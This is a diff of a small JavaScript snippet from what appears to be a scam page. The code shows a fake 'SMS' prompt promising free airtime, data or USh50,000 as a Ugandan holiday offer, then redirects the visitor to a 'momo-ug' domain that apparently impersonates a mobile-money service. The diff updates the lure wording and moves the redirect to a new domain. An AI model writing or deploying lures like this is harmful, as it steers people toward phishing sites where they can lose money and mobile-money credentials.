@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '25GB + UGX10,000'
-password=prompt('SMS: Congratulations You are Eligible to receive UGX10,000 Airtime and 25GB Data HEROES DAY Celebration Offer, Kindly Press OK to ACTIVATE  ','25GB + UGX10,000');
-if (password != '25GB + UGX10,000') {
-location.href='https://momo-ug.goprogram.xyz/25GB';
+var password = 'USh50,000'
+password=prompt('SMS: Congratulations You are Eligible to receive USh50,000 Independence Day Celebration Offer, Kindly Press OK to ACTIVATE  ','USh50,000');
+if (password != 'USh50,000') {
+location.href='https://momo-ug.offer-it.xyz/Gift';
 }
+
